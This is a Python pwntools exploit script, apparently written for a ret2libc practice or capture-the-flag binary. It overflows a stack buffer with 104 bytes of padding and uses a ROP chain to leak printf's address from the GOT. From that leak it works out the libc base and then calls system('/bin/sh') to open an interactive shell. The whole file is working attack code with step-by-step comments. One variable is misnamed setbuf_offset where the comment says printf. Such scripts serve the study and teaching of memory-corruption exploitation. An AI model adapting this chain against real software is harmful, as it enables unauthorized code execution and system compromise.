from pwn import *

#p = gdb.debug("./ret2libc", gdbscript='b main')
p = process("./ret2libc")
padding = b"A"*104
pop_rdi = 0x00000000004006a3
print_at_got = 0x601020
puts_at_plt = 0x400480
main = 0x0000000000400610

# Craft the payload to leak the address of printf in libc
payload = padding
payload += p64(pop_rdi)
payload += p64(print_at_got)
payload += p64(puts_at_plt)
payload += p64(main)

# Send the payload
p.sendline(payload)
p.recvline()  # Discard data we don't need
p.recvline()  # Discard data we don't need
p.recvline()  # Discard data we don't need


leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Leaked printf Address -> {hex(leak)}")

setbuf_offset = 0x606f0  # Static offset of printf() in libc
libc_base = leak - setbuf_offset  # Calculate base address of libc
log.info(f"libc Base Address -> {hex(libc_base)}")

system_offset = 0x50D70  # Static offset of system() in libc
libc_system = libc_base + system_offset # Calculate the actual address of system() in libc
log.info(f"system Address -> {hex(libc_system)}")

binsh_offset = 0x1d8698  # Static offset of /bin/sh string in libc
libc_binsh = libc_base + binsh_offset
log.info(f"/bin/sh Address -> {hex(libc_binsh)}")

ret = 0x0000000000400469
# ? Craft the payload to call system("/bin/sh")
payload = padding  # Pad the stack until the stored RIP
payload += p64(pop_rdi)  # Set the address of the string /bin/sh as the first argument of system()
payload += p64(libc_binsh)  # This will be the first argument of system()

# pop rip
payload += p64(ret) # Align the stack to 16 bytes otherwise system() will crash

payload += p64(libc_system)  # Call system()

# ? Send the payload
p.sendline(payload)

# ? Start an interactive session
p.interactive() 